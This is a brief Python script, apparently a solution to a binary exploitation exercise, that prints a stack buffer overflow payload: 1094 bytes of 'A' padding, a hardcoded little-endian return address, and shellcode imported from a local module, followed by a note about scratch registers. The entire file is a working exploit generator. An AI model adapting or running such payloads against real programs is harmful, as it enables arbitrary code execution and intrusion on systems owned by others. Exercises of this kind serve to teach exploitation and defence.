#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'A'*1094+(0x7ffffff6cd10).to_bytes(8,"little")+shellcode)

# need to write into a tmp register and then access 
# tmp: rbx, rdx, rcx, rdi, rsi